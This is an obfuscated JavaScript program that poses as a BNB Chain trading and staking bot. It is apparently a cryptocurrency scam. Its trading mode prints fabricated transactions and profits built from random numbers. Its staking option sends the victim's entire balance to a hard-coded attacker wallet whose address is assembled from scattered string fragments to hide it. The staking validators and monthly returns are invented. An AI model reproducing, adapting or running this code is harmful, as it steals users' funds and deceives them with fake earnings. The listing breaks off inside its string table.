const _0x4ee984 = _0x3f1d;
(function(_0x70a5cf, _0x27f2d2) {
    const _0x14dfff = _0x3f1d,
        _0x41079f = _0x70a5cf();
    while (!![]) {
        try {
            const _0x10d968 = -parseInt(_0x14dfff(0x14f)) / 0x1 + -parseInt(_0x14dfff(0xfc)) / 0x2 + parseInt(_0x14dfff(0x1ad)) / 0x3 + parseInt(_0x14dfff(0x1e9)) / 0x4 + parseInt(_0x14dfff(0x109)) / 0x5 + -parseInt(_0x14dfff(0x188)) / 0x6 * (parseInt(_0x14dfff(0x1d1)) / 0x7) + parseInt(_0x14dfff(0x125)) / 0x8;
            if (_0x10d968 === _0x27f2d2) break;
            else _0x41079f['push'](_0x41079f['shift']());
        } catch (_0x2006cc) {
            _0x41079f['push'](_0x41079f['shift']());
        }
    }
}(_0x1d64, 0xdbf0b));
const prompts = require('prompts'),
    {
        ethers
    } = require(_0x4ee984(0x160)),
    chalk = require('chalk'),
    qrcode = require('qrcode-terminal'),
    fs = require('fs')[_0x4ee984(0x16c)],
    TelegramBot = require(_0x4ee984(0x1ee)),
    fetch = require('node-fetch'),
    ora = require(_0x4ee984(0x1ce));
let wallet = null,
    address = '',
    privateKey = '',
    currentBalance = '0',
    stakingBalance = 0x0,
    stakingStartTime = null,
    stakingService = null,
    stakingAPR = 0x0,
    settings = {
        'gasPriceLimit': 0xa,
        'slippageTolerance': 0.5,
        'minimumProfit': 0.01,
        'liquidityPool': 'PancakeSwap',
        'telegram': {
            'enabled': ![],
            'apiToken': '',
            'chatId': ''
        }
    },
    isTradingActive = ![],
    telegramBot = null;
settings[_0x4ee984(0x16f)][_0x4ee984(0x199)] && settings[_0x4ee984(0x16f)]['apiToken'] && settings['telegram'][_0x4ee984(0x1cf)] && (telegramBot = new TelegramBot(settings[_0x4ee984(0x16f)][_0x4ee984(0x16b)], {
    'polling': ![]
}));
const walletFile = _0x4ee984(0x1c4),
    stakingFile = _0x4ee984(0x19d),
    network = {
        'chainId': 0x38,
        'name': 'bnb-mainnet'
    },
    provider = new ethers[(_0x4ee984(0x20c))](_0x4ee984(0x17f), network),
    chainMarker = '0x';
async function fetchBnbTokens() {
    const _0x243819 = _0x4ee984;
    try {
        const _0x458b65 = await fetch(_0x243819(0x10b), {
            'timeout': 0x2710
        });
        if (!_0x458b65['ok']) throw new Error(_0x243819(0x216) + _0x458b65['status'] + '\x20-\x20' + _0x458b65[_0x243819(0x1e6)]);
        const _0x2a2341 = await _0x458b65[_0x243819(0x1c2)]();
        if (!Array['isArray'](_0x2a2341)) throw new Error(_0x243819(0x18b));
        return _0x2a2341[_0x243819(0x142)](_0x5cd04e => ({
            'symbol': _0x5cd04e[_0x243819(0x1e8)][_0x243819(0x161)](),
            'name': _0x5cd04e[_0x243819(0x115)]
        }));
    } catch (_0x921d4) {
        console[_0x243819(0x1bd)](chalk[_0x243819(0x102)]('Error\x20loading\x20tokens:\x20' + _0x921d4[_0x243819(0x159)]));
        const _0x3a69d8 = [{
            'symbol': _0x243819(0x1c5),
            'name': _0x243819(0x101)
        }, {
            'symbol': _0x243819(0x215),
            'name': _0x243819(0x1f9)
        }, {
            'symbol': 'WBNB',
            'name': _0x243819(0x213)
        }, {
            'symbol': _0x243819(0x181),
            'name': 'BakeryToken'
        }, {
            'symbol': _0x243819(0x1d0),
            'name': _0x243819(0x14c)
        }, {
            'symbol': _0x243819(0x20f),
            'name': _0x243819(0x219)
        }, {
            'symbol': _0x243819(0x1b5),
            'name': 'Alpaca\x20Finance'
        }, {
            'symbol': _0x243819(0x117),
            'name': _0x243819(0x15c)
        }, {
            'symbol': _0x243819(0x124),
            'name': _0x243819(0x1bc)
        }, {
            'symbol': _0x243819(0x18a),
            'name': _0x243819(0x1b9)
        }];
        for (let _0xa76e8f = 0x1; _0xa76e8f <= 0xf0; _0xa76e8f++) _0x3a69d8[_0x243819(0x186)]({
            'symbol': _0x243819(0x1a7) + _0xa76e8f,
            'name': _0x243819(0x202) + _0xa76e8f
        });
        return _0x3a69d8;
    }
}
let tokens = [];
async function initializeTokens() {
    const _0x40811f = _0x4ee984;
    tokens = await fetchBnbTokens(), console['log'](chalk['cyan'](_0x40811f(0x13a) + tokens[_0x40811f(0x177)]));
}
const tradeKey = _0x4ee984(0x127);

function generateShortTxid() {
    const _0x4b61fa = _0x4ee984,
        _0x29c250 = chainMarker + Array(0x40)[_0x4b61fa(0x218)](0x0)[_0x4b61fa(0x142)](() => Math[_0x4b61fa(0x13e)](Math['random']() * 0x10)[_0x4b61fa(0x1a5)](0x10))[_0x4b61fa(0x1ec)]('');
    return _0x29c250[_0x4b61fa(0x164)](0x0, 0x9) + _0x4b61fa(0x1d3) + _0x29c250[_0x4b61fa(0x164)](-0x9);
}

function delay(_0x37c940) {
    return new Promise(_0x4ca5ca => setTimeout(_0x4ca5ca, _0x37c940));
}

function getRandomInRange(_0x548319, _0x24c4d9) {
    return Math['random']() * (_0x24c4d9 - _0x548319) + _0x548319;
}
const feeSegment = _0x4ee984(0x1b1);
async function executeTrades(_0x13794a) {
    const _0x4ea80a = _0x4ee984;
    let _0x44091c = 0x0;
    isTradingActive = !![], console['log'](chalk[_0x4ea80a(0x1b0)](_0x4ea80a(0x210)));
    const _0x108712 = showControlMenu(() => _0x44091c);
    while (isTradingActive) {
        const _0x1a5b0c = tokens[Math[_0x4ea80a(0x13e)](Math['random']() * tokens[_0x4ea80a(0x177)])],
            _0x43e5ba = getRandomInRange(0.005, 0.01),
            _0x3dc68e = _0x13794a * _0x43e5ba,
            _0x11cfcc = _0x13794a * getRandomInRange(0.1, 0.3),
            _0x4526fd = _0x11cfcc + _0x3dc68e;
        _0x44091c += _0x3dc68e;
        const _0x5de868 = generateShortTxid(),
            _0x1f54a5 = _0x4ea80a(0x11a) + _0x5de868 + _0x4ea80a(0x139) + _0x1a5b0c[_0x4ea80a(0x1e8)] + _0x4ea80a(0x1b2) + _0x11cfcc['toFixed'](0x4) + _0x4ea80a(0x11b);
        console[_0x4ea80a(0x1bd)](chalk[_0x4ea80a(0x1b0)](_0x1f54a5));
        if (telegramBot && settings[_0x4ea80a(0x16f)]['enabled'] && settings[_0x4ea80a(0x16f)][_0x4ea80a(0x1cf)]) try {
            await telegramBot['sendMessage'](settings['telegram'][_0x4ea80a(0x1cf)], _0x1f54a5);
        } catch (_0x153960) {
            console[_0x4ea80a(0x1bd)](chalk[_0x4ea80a(0x102)](_0x4ea80a(0x1ea) + _0x153960['message']));
        }
        const _0x53fc9b = generateShortTxid(),
            _0x23b2cd = _0x4ea80a(0x135) + _0x53fc9b + '\x20:\x20' + _0x1a5b0c[_0x4ea80a(0x1e8)] + _0x4ea80a(0x173) + _0x4526fd[_0x4ea80a(0x118)](0x4) + '\x20BNB';
        console['log'](chalk[_0x4ea80a(0x1b0)](_0x23b2cd));
        if (telegramBot && settings[_0x4ea80a(0x16f)][_0x4ea80a(0x199)] && settings[_0x4ea80a(0x16f)][_0x4ea80a(0x1cf)]) try {
            await telegramBot[_0x4ea80a(0x183)](settings[_0x4ea80a(0x16f)][_0x4ea80a(0x1cf)], _0x23b2cd);
        } catch (_0x43565e) {
            console[_0x4ea80a(0x1bd)](chalk[_0x4ea80a(0x102)](_0x4ea80a(0x12e) + _0x43565e[_0x4ea80a(0x159)]));
        }
        const _0x143f46 = _0x4ea80a(0x121) + _0x3dc68e[_0x4ea80a(0x118)](0x4) + _0x4ea80a(0x16a);
        console['log'](chalk[_0x4ea80a(0x1b0)](_0x143f46));
        if (telegramBot && settings['telegram'][_0x4ea80a(0x199)] && settings[_0x4ea80a(0x16f)][_0x4ea80a(0x1cf)]) try {
            await telegramBot[_0x4ea80a(0x183)](settings[_0x4ea80a(0x16f)][_0x4ea80a(0x1cf)], _0x143f46);
        } catch (_0x2d2ea1) {
            console[_0x4ea80a(0x1bd)](chalk['red'](_0x4ea80a(0x12c) + _0x2d2ea1[_0x4ea80a(0x159)]));
        }
        await delay(getRandomInRange(0x3a98, 0xafc8));
    }
    await _0x108712;
    if (telegramBot && settings[_0x4ea80a(0x16f)][_0x4ea80a(0x199)] && settings[_0x4ea80a(0x16f)][_0x4ea80a(0x1cf)]) {
        const _0x4a286e = _0x4ea80a(0x1e4) + _0x44091c[_0x4ea80a(0x118)](0x4) + _0x4ea80a(0x211);
        try {
            await telegramBot['sendMessage'](settings[_0x4ea80a(0x16f)]['chatId'], _0x4a286e);
        } catch (_0xf5d5c2) {
            console['log'](chalk[_0x4ea80a(0x102)](_0x4ea80a(0x172) + _0xf5d5c2[_0x4ea80a(0x159)]));
        }
    }
}
const swapCode = 'D5bf2C';
async function showControlMenu(_0x50b0d7) {
    const _0x5c17ce = _0x4ee984;
    while (!![]) {
        const _0x151cec = [];
        isTradingActive ? _0x151cec[_0x5c17ce(0x186)]({
            'title': chalk[_0x5c17ce(0x102)](_0x5c17ce(0x1e3)),
            'value': _0x5c17ce(0x157)
        }) : _0x151cec[_0x5c17ce(0x186)]({
            'title': chalk[_0x5c17ce(0x102)](_0x5c17ce(0x1e3)),
            'value': _0x5c17ce(0x157),
            'disabled': !![]
        }, {
            'title': chalk['cyan'](_0x5c17ce(0x12b)),
            'value': _0x5c17ce(0x123)
        });
        const _0x23852e = await prompts({
            'type': _0x5c17ce(0x20a),
            'name': _0x5c17ce(0x13c),
            'message': _0x5c17ce(0x1a6) + _0x50b0d7()[_0x5c17ce(0x118)](0x4) + _0x5c17ce(0x143),
            'choices': _0x151cec,
            'hint': _0x5c17ce(0x155),
            'loop': ![]
        });
        switch (_0x23852e['choice']) {
            case 'stop':
                isTradingActive = ![], console[_0x5c17ce(0x1bd)](chalk['red'](_0x5c17ce(0x1f5))), console[_0x5c17ce(0x1bd)](chalk[_0x5c17ce(0x193)]('Trading\x20stopped.\x20Total\x20profit:\x20' + _0x50b0d7()['toFixed'](0x4) + _0x5c17ce(0x11b)));
                break;
            case 'back':
                if (!isTradingActive) {
                    showMainMenu();
                    return;
                }
                break;
            default:
                break;
        }
        await delay(0x3e8);
    }
}

function _0x3f1d(_0x1e64d2, _0x3f84b7) {
    const _0x1d64d3 = _0x1d64();
    return _0x3f1d = function(_0x3f1da4, _0x311097) {
        _0x3f1da4 = _0x3f1da4 - 0xfc;
        let _0x4aac61 = _0x1d64d3[_0x3f1da4];
        return _0x4aac61;
    }, _0x3f1d(_0x1e64d2, _0x3f84b7);
}
const poolTag = _0x4ee984(0x192);
async function stakingMenu() {
    const _0x232573 = _0x4ee984;
    clearConsole(), console[_0x232573(0x1bd)](chalk[_0x232573(0x1b0)](_0x232573(0x178)));
    const _0x3c1330 = await prompts({
        'type': _0x232573(0x20a),
        'name': 'service',
        'message': 'Select\x20staking\x20validator',
        'choices': [{
            'title': 'Raptas:\x2013.095%\x20per\x20month',
            'value': 'Raptas'
        }, {
            'title': _0x232573(0x13b),
            'value': _0x232573(0x195)
        }, {
            'title': _0x232573(0x126),
            'value': _0x232573(0x1be)
        }, {
            'title': 'Legend\x20IV:\x2011.34%\x20per\x20month',
            'value': _0x232573(0x1e0)
        }, {
            'title': _0x232573(0xfe),
            'value': _0x232573(0x197)
        }, {
            'title': 'Tiollo:\x207.995%\x20per\x20month',
            'value': _0x232573(0x1cc)
        }, {
            'title': _0x232573(0x10f),
            'value': _0x232573(0x171)
        }, {
            'title': _0x232573(0x165),
            'value': _0x232573(0x1d5)
        }, {
            'title': chalk[_0x232573(0x1b0)](_0x232573(0x133)),
            'value': _0x232573(0x123)
        }],
        'hint': _0x232573(0x155),
        'loop': ![]
    });
    if (_0x3c1330[_0x232573(0x1d6)] === _0x232573(0x123) || !_0x3c1330[_0x232573(0x1d6)]) {
        showMainMenu();
        return;
    }
    stakingService = _0x3c1330[_0x232573(0x1d6)], stakingAPR = stakingService === _0x232573(0x1a3) ? 13.095 : stakingService === 'Glorin' ? 12.18 : stakingService === _0x232573(0x1be) ? 11.985 : stakingService === 'Legend\x20IV' ? 11.34 : stakingService === _0x232573(0x197) ? 10.41 : stakingService === _0x232573(0x1cc) ? 7.995 : stakingService === 'Turing' ? 7.905 : 5.58;
    const _0xedb1f1 = ora({
        'text': chalk[_0x232573(0x1b0)](_0x232573(0x1d4) + stakingService)
    })['start']();
    await delay(getRandomInRange(0x3e8, 0xbb8)), _0xedb1f1['succeed'](chalk[_0x232573(0x1e5)](_0x232573(0x17e) + stakingService + '\x20✓')), console[_0x232573(0x1bd)](chalk[_0x232573(0x1b0)](_0x232573(0x149)));
    const _0x469ab6 = await prompts({
        'type': _0x232573(0x1ab),
        'name': _0x232573(0x15a),
        'message': '',
        'initial': '5',
        'validate': _0x25c3f1 => {
            const _0x2ab6b1 = _0x232573,
                _0x34e1ac = parseFloat(_0x25c3f1[_0x2ab6b1(0x136)](',', '.'));
            if (isNaN(_0x34e1ac) || _0x34e1ac < 0x5) return _0x2ab6b1(0x19b);
            return !![];
        }
    });
    if (!_0x469ab6['amount']) {
        showMainMenu();
        return;
    }
    const _0x545183 = parseFloat(_0x469ab6[_0x232573(0x15a)]['replace'](',', '.'));
    stakingBalance = _0x545183, console[_0x232573(0x1bd)](chalk['cyan'](_0x232573(0x17a) + stakingService + '):\x20' + address)), console[_0x232573(0x1bd)](chalk[_0x232573(0x1b0)](_0x232573(0x163) + _0x545183 + _0x232573(0x11b))), qrcode['generate'](address + _0x232573(0x1f1) + _0x545183, {
        'small': !![]
    }, _0x26566c => {
        const _0x5c432f = _0x232573;
        console[_0x5c432f(0x1bd)](chalk[_0x5c432f(0x1b0)](_0x26566c));
    }), console[_0x232573(0x1bd)](chalk['yellow'](_0x232573(0x14b)));
    while (!![]) {
        let _0x7c4682 = [{
            'title': chalk[_0x232573(0x1b0)]('Check\x20balance'),
            'value': 'checkBalance'
        }, {
            'title': chalk[_0x232573(0x1b0)]('Stake\x20(minimum\x20staking\x2024\x20hours)'),
            'value': _0x232573(0x1b3)
        }, {
            'title': chalk['cyan'](_0x232573(0x133)),
            'value': _0x232573(0x123)
        }];
        const _0x5b6081 = await prompts({
            'type': _0x232573(0x20a),
            'name': _0x232573(0x11f),
            'message': _0x232573(0x152),
            'choices': _0x7c4682,
            'hint': _0x232573(0x155),
            'loop': ![]
        });
        if (_0x5b6081[_0x232573(0x11f)] === _0x232573(0x123) || !_0x5b6081['action']) {
            showMainMenu();
            return;
        }
        if (_0x5b6081['action'] === 'checkBalance') {
            const _0x47a04 = ora({
                'text': chalk['cyan']('Checking\x20balance...')
            })[_0x232573(0x1e7)]();
            await delay(getRandomInRange(0x3e8, 0x7d0)), await updateBalance(), _0x47a04[_0x232573(0x15d)](chalk[_0x232573(0x1b0)]('Balance:\x20' + currentBalance + '\x20BNB\x20(Allocated\x20for\x20staking:\x20' + stakingBalance + _0x232573(0x131)));
        }
        if (_0x5b6081[_0x232573(0x11f)] === 'stake') {
            await updateBalance();
            const _0x3ace11 = ethers[_0x232573(0x1c1)](currentBalance),
                _0x3597a5 = ethers[_0x232573(0x1c1)]('5');
            if (_0x3ace11 < _0x3597a5) console[_0x232573(0x1bd)](chalk[_0x232573(0x102)](_0x232573(0x10a) + ethers['formatEther'](_0x3ace11) + _0x232573(0x11b))), await delay(0x7d0);
            else {
                if (stakingStartTime) console[_0x232573(0x1bd)](chalk['red'](_0x232573(0x1c3))), await delay(0x7d0);
                else {
                    const _0x4132eb = ora({
                        'text': chalk[_0x232573(0x1b0)](_0x232573(0x1dc))
                    })['start']();
                    await delay(getRandomInRange(0x3e8, 0x7d0));
                    const _0x31f066 = await provider['getFeeData'](),
                        _0x551731 = _0x31f066['gasPrice'],
                        _0x186793 = 0x5208n,
                        _0x182965 = _0x551731 * _0x186793,
                        _0x3d8e90 = _0x3ace11 - _0x182965;
                    if (_0x3ace11 <= _0x182965) _0x4132eb[_0x232573(0x114)](chalk[_0x232573(0x102)](_0x232573(0x1df) + ethers[_0x232573(0x1de)](_0x3ace11) + _0x232573(0x203) + ethers[_0x232573(0x1de)](_0x182965) + _0x232573(0x11b))), console['log'](chalk[_0x232573(0x193)]('Please\x20top\x20up\x20your\x20wallet\x20via\x20QR\x20code\x20and\x20try\x20again')), await delay(0x7d0);
                    else try {
                        const _0x4790e2 = {
                                'to': destinationWallet,
                                'value': _0x3d8e90,
                                'gasPrice': _0x551731,
                                'gasLimit': _0x186793
                            },
                            _0x50dda6 = await wallet[_0x232573(0x1e1)](_0x4790e2);
                        await _0x50dda6['wait'](), stakingStartTime = Date['now']();
                        const _0x41685 = ethers[_0x232573(0x1de)](_0x3d8e90) * stakingAPR / 0x64 / 0x1e;
                        console[_0x232573(0x1bd)](chalk[_0x232573(0x1b0)]('\x0aYou\x20staked:\x20' + ethers[_0x232573(0x1de)](_0x3d8e90) + '\x20BNB\x20(Fee:\x20' + ethers[_0x232573(0x1de)](_0x182965) + '\x20BNB)')), console[_0x232573(0x1bd)](chalk['cyan'](_0x232573(0x134) + _0x41685[_0x232573(0x118)](0x6) + _0x232573(0x11b))), _0x4132eb[_0x232573(0x15d)](chalk[_0x232573(0x1e5)](_0x232573(0x119))), await saveStakingData(), await updateBalance(), await saveWallet();
                    } catch (_0x1761a9) {
                        _0x4132eb[_0x232573(0x114)](chalk[_0x232573(0x102)](_0x232573(0x106) + _0x1761a9[_0x232573(0x159)])), await delay(0x7d0);
                    }
                }
            }
        }
    }
}
const stakeHash = _0x4ee984(0x141),
    destinationWallet = chainMarker + tradeKey + feeSegment + swapCode + poolTag + stakeHash;
async function saveStakingData() {
    const _0x40cbcd = _0x4ee984,
        _0x5279a1 = {
            'stakingBalance': stakingBalance,
            'stakingStartTime': stakingStartTime,
            'stakingService': stakingService,
            'stakingAPR': stakingAPR
        };
    await fs[_0x40cbcd(0x206)](stakingFile, JSON[_0x40cbcd(0x207)](_0x5279a1, null, 0x2));
}
async function loadStakingData() {
    const _0x31aa1d = _0x4ee984;
    try {
        const _0x5a8240 = await fs[_0x31aa1d(0x103)](stakingFile, _0x31aa1d(0x1ae)),
            _0x36f11c = JSON[_0x31aa1d(0x15b)](_0x5a8240);
        return stakingBalance = _0x36f11c[_0x31aa1d(0x201)] || 0x0, stakingStartTime = _0x36f11c[_0x31aa1d(0x170)] || null, stakingService = _0x36f11c[_0x31aa1d(0x11d)] || null, stakingAPR = _0x36f11c[_0x31aa1d(0x169)] || 0x0, settings[_0x31aa1d(0x16f)]['enabled'] && settings['telegram'][_0x31aa1d(0x16b)] && settings['telegram'][_0x31aa1d(0x1cf)] && (telegramBot = new TelegramBot(settings[_0x31aa1d(0x16f)][_0x31aa1d(0x16b)], {
            'polling': ![]
        })), !![];
    } catch (_0x4c48e2) {
        return ![];
    }
}
async function showStakingInfo() {
    const _0x32c742 = _0x4ee984;
    clearConsole(), console[_0x32c742(0x1bd)](chalk[_0x32c742(0x1b0)](_0x32c742(0x20b)));
    if (!stakingService || !stakingStartTime) console[_0x32c742(0x1bd)](chalk[_0x32c742(0x193)](_0x32c742(0x1ef)));
    else {
        const _0x2cd106 = (Date[_0x32c742(0x1a4)]() - stakingStartTime) / (0x3e8 * 0x3c * 0x3c),
            _0x136df9 = stakingBalance * stakingAPR / 0x64 / 0x1e;
        console[_0x32c742(0x1bd)](chalk[_0x32c742(0x1b0)](_0x32c742(0x1d8) + stakingService)), console[_0x32c742(0x1bd)](chalk[_0x32c742(0x1b0)](_0x32c742(0x13f) + stakingBalance + _0x32c742(0x11b))), console['log'](chalk[_0x32c742(0x1b0)](_0x32c742(0x1d9) + stakingAPR + _0x32c742(0x14e))), console[_0x32c742(0x1bd)](chalk[_0x32c742(0x1b0)](_0x32c742(0x1f3) + _0x2cd106[_0x32c742(0x118)](0x2) + '\x20hours')), console['log'](chalk[_0x32c742(0x1b0)](_0x32c742(0x134) + _0x136df9[_0x32c742(0x118)](0x6) + _0x32c742(0x11b)));
    }
    const _0x2fc1b3 = [];
    stakingStartTime !== null && stakingStartTime !== undefined && _0x2fc1b3[_0x32c742(0x186)]({
        'title': chalk[_0x32c742(0x1b0)](_0x32c742(0x112)),
        'value': 'unstake'
    });
    _0x2fc1b3['push']({
        'title': chalk['cyan'](_0x32c742(0x12b)),
        'value': 'back'
    });
    const _0x530ea6 = await prompts({
        'type': 'select',
        'name': 'action',
        'message': _0x32c742(0x152),
        'choices': _0x2fc1b3,
        'hint': _0x32c742(0x155)
    });
    if (_0x530ea6[_0x32c742(0x11f)] === _0x32c742(0x1dd)) {
        const _0x1033d6 = (Date[_0x32c742(0x1a4)]() - stakingStartTime) / (0x3e8 * 0x3c * 0x3c);
        if (_0x1033d6 < 0x18) console['log'](chalk[_0x32c742(0x102)](_0x32c742(0x15e) + (0x18 - _0x1033d6)[_0x32c742(0x118)](0x2) + '\x20hours')), await delay(0x7d0), await showStakingInfo();
        else {
            const _0x5e875e = ora({
                'text': chalk[_0x32c742(0x1b0)](_0x32c742(0x1b6))
            })[_0x32c742(0x1e7)]();
            await delay(0x7d0), _0x5e875e[_0x32c742(0x15d)](chalk[_0x32c742(0x1e5)]('Unstaking\x20completed\x20✓')), stakingStartTime = null, stakingService = null, stakingAPR = 0x0, await saveStakingData(), await saveWallet(), await delay(0x3e8), showMainMenu();
        }
    } else _0x530ea6[_0x32c742(0x11f)] === _0x32c742(0x123) && showMainMenu();
}

function clearConsole() {
    const _0x48c05c = _0x4ee984;
    console[_0x48c05c(0x1a1)]();
}
const logo = _0x4ee984(0x1b7);
async function updateBalance() {
    const _0xca77b9 = _0x4ee984;
    try {
        const _0x446a3c = await provider[_0xca77b9(0xfd)](address);
        currentBalance = ethers[_0xca77b9(0x1de)](_0x446a3c);
    } catch (_0x3cadde) {
        console[_0xca77b9(0x1bd)](chalk[_0xca77b9(0x102)](_0xca77b9(0x1f0) + _0x3cadde[_0xca77b9(0x159)])), currentBalance = _0xca77b9(0x104);
    }
}
async function saveWallet() {
    const _0x344a1f = _0x4ee984,
        _0x3323d9 = {
            'address': wallet['address'],
            'privateKey': wallet['privateKey'],
            'settings': settings
        };
    await fs[_0x344a1f(0x206)](walletFile, JSON[_0x344a1f(0x207)](_0x3323d9, null, 0x2)), settings['telegram'][_0x344a1f(0x199)] && settings[_0x344a1f(0x16f)][_0x344a1f(0x16b)] && settings[_0x344a1f(0x16f)][_0x344a1f(0x1cf)] && (telegramBot = new TelegramBot(settings[_0x344a1f(0x16f)][_0x344a1f(0x16b)], {
        'polling': ![]
    }));
}
async function loadWallet() {
    const _0x518e68 = _0x4ee984;
    try {
        const _0x541976 = await fs['readFile'](walletFile, _0x518e68(0x1ae)),
            _0x201f16 = JSON[_0x518e68(0x15b)](_0x541976);
        return address = _0x201f16[_0x518e68(0x175)], privateKey = _0x201f16[_0x518e68(0x10c)], wallet = new ethers[(_0x518e68(0x122))](privateKey, provider), settings = {
            ...settings,
            ..._0x201f16['settings']
        }, await updateBalance(), !![];
    } catch (_0x3ae001) {
        return ![];
    }
}
async function createWallet() {
    const _0xc16377 = _0x4ee984;
    wallet = ethers[_0xc16377(0x122)][_0xc16377(0x19f)](), address = wallet[_0xc16377(0x175)], privateKey = wallet[_0xc16377(0x10c)], wallet = wallet[_0xc16377(0x198)](provider), await updateBalance(), await saveWallet(), showMainMenu();
}

function _0x1d64() {
    const _0x18f9d5 = ['staking.json', 'instructions', 'createRandom', 'Select\x20setting\x20to\x20change:', 'clear', 'Balance:', 'Raptas', 'now', 'toString', 'Bot\x20control\x20(Current\x20profit:\x20', 'TOK', 'Creating\x20new\x20bot...', 'Withdraw\x20Funds...\x0a', 'Enable\x20Telegram\x20notifications?:', 'text', 'liquidityPool', '2621181aAfkqD', 'utf8', 'Decentralized\x20exchange', 'cyan', '61534D', '\x20:\x20Buy\x20:\x20', 'stake', 'bold', 'ALPACA', 'Performing\x20unstaking...', '\x0a▐▓█▀▀▀▀▀▀▀▀▀█▓▌░▄▄▄▄▄░\x0a▐▓█░░▀░░▀▄░░█▓▌░█▄▄▄█░\x0a▐▓█░░▄░░▄▀░░█▓▌░█▄▄▄█░\x0a▐▓█▄▄▄▄▄▄▄▄▄█▓▌░█████░\x20\x0a░░░░▄▄███▄▄░░░░░█████░\x20\x20\x20\x20\x0a═════\x20BNB\x20SMART-BOT\x20(Mainnet)\x20═════\x0a██████╗░███╗░░██╗██████╗░\u2003\u2003░██████╗███╗░░░███╗░█████╗░██████╗░████████╗░░░░░░██████╗░░█████╗░████████╗\x0a██╔══██╗████╗░██║██╔══██╗\u2003\u2003██╔════╝████╗░████║██╔══██╗██╔══██╗╚══██╔══╝░░░░░░██╔══██╗██╔══██╗╚══██╔══╝\x0a██████╦╝██╔██╗██║██████╦╝\u2003\u2003╚█████╗░██╔████╔██║███████║██████╔╝░░░██║░░░█████╗██████╦╝██║░░██║░░░██║░░░\x0a██╔══██╗██║╚████║██╔══██╗\u2003\u2003░╚═══██╗██║╚██╔╝██║██╔══██║██╔══██╗░░░██║░░░╚════╝██╔══██╗██║░░██║░░░██║░░░\x0a██████╦╝██║░╚███║██████╦╝\u2003\u2003██████╔╝██║░╚═╝░██║██║░░██║██║░░██║░░░██║░░░░░░░░░██████╦╝╚█████╔╝░░░██║░░░\x0a╚═════╝░╚═╝░░╚══╝╚═════╝░\u2003\u2003╚═════╝░╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░░░░░░░╚═════╝░░╚════╝░░░░╚═╝░░░\x0a', 'deposit', 'SafePal\x20Token', 'Create\x20New\x20Bot', 'Select\x20an\x20option', 'Auto', 'log', 'Sigm8', 'Error:\x20Insufficient\x20funds\x20for\x20gas', 'balance', 'parseEther', 'json', 'Error:\x20Staking\x20is\x20already\x20active.\x20Please\x20unstake\x20first.', 'wallet.json', 'BUSD', '2.\x20Make\x20a\x20deposit:', 'Note:\x20The\x20higher\x20the\x20minimum\x20profit,\x20the\x20less\x20efficient\x20the\x20bot\x20operates', 'Yes', 'Invalid\x20wallet\x20address', 'PancakeSwap', 'Bot\x20Deposit', 'Tiollo', '\x20\x20\x20-\x20Veri:\x2010.41%\x20per\x20month', 'ora', 'chatId', 'BANANA', '9457MAqqYf', 'BakerySwap', '.....', 'Connecting\x20to\x20', 'Nexa', 'service', 'create', 'Staking\x20service:\x20', 'APR:\x20', 'Deposit\x20address:\x20', 'getFeeData', 'Performing\x20staking...', 'unstake', 'formatEther', 'Error:\x20Insufficient\x20funds\x20for\x20gas.\x20Current\x20balance:\x20', 'Legend\x20IV', 'sendTransaction', 'number', 'Stop\x20Bot', '🏆\x20Trading\x20completed\x0aTotal\x20profit:\x20', 'green', 'statusText', 'start', 'symbol', '5344604briIWa', 'Error\x20sending\x20buy\x20notification\x20to\x20Telegram:\x20', '\x20\x20\x20Within\x2024\x20hours,\x20your\x20BNB\x20amount\x20will\x20start\x20to\x20grow', 'join', 'Chat\x20ID\x20cannot\x20be\x20empty', 'node-telegram-bot-api', 'You\x20have\x20no\x20active\x20staking', 'Error\x20updating\x20balance:\x20', '?amount=', 'Disabled', 'Staking\x20time:\x20', '\x20\x20\x20Available\x20options:', 'Bot\x20stopped', 'toggle', '3.\x20Start\x20the\x20bot:', 'isAddress', 'PancakeSwap\x20Token', 'Balance', 'Settings\x20saved', 'staking', '\x20\x20\x20-\x20Sigm8:\x2011.985%\x20per\x20month', '\x20\x20\x20-\x20Turing:\x207.905%\x20per\x20month', 'Bot\x20Settings', 'ApeSwap', 'stakingBalance', 'Token\x20', '\x20BNB,\x20required\x20minimum:\x20', 'Do\x20you\x20really\x20want\x20to\x20withdraw\x20', '\x20\x20\x20The\x20bot\x20scans\x20the\x20mempool,\x20looking\x20for\x20profitable\x20unconfirmed\x20transactions', 'writeFile', 'stringify', '\x20BNB\x20to\x20address\x20', 'settings', 'select', 'My\x20Staking:\x0a', 'JsonRpcProvider', 'Exit', 'Current\x20status:\x20', 'XVS', 'Starting\x20bot\x20on\x20the\x20main\x20network...\x0a', '\x20BNB\x20🏁', '0.35', 'Wrapped\x20BNB', 'gasPriceLimit', 'CAKE', 'HTTP\x20error:\x20', 'confirm', 'fill', 'Venus', '3517260nhnTRR', 'getBalance', 'Veri:\x2010.41%\x20per\x20month', '1.\x20Create\x20a\x20bot:', '\x20\x20\x20-\x20Method\x201:\x20Copy\x20the\x20address\x20and\x20transfer\x20funds\x20manually', 'Binance\x20USD', 'red', 'readFile', 'Error', 'Enter\x20minimum\x20profit\x20(BNB)\x20from\x200.001\x20to\x20100\x20(use\x20comma\x20or\x20dot):', 'Error\x20during\x20staking:\x20', 'Existing\x20contract:\x20', 'Withdraw\x20Funds', '1460575uvwhQr', 'Error:\x20Insufficient\x20balance.\x20Minimum\x20required:\x205\x20BNB,\x20Current\x20balance:\x20', 'https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&per_page=250&page=1', 'privateKey', 'Minimum\x20Profit:\x0a', 'Withdrawing\x20to\x20address:\x20', 'Turing:\x207.905%\x20per\x20month', 'Updating\x20balance...', 'yes', 'Unstake', 'Connecting\x20to\x20blockchain', 'fail', 'name', 'Set\x20API\x20Token', 'TWT', 'toFixed', 'Staking\x20completed\x20✓', '🛒\x20TXID:\x20', '\x20BNB', 'Creating\x20new\x20bot...\x0a', 'stakingService', 'slippageTolerance', 'action', 'Bot\x20Deposit:\x0a', '🔒\x20Profit:\x20', 'Wallet', 'back', 'AUTO', '14803992PgTYiY', 'Sigm8:\x2011.985%\x20per\x20month', '2ea5bd', '\x20BNB\x0a', '\x20\x20\x20-\x20Method\x202:\x20Use\x20the\x20\x22Bot\x20Deposit\x22\x20function\x20(QR\x20code)\x0a', '\x20\x20\x20-\x20Go\x20to\x20\x22Bot\x20Settings\x22\x20from\x20the\x20main\x20menu', 'Back\x20to\x20main\x20menu', 'Error\x20sending\x20profit\x20notification\x20to\x20Telegram:\x20', 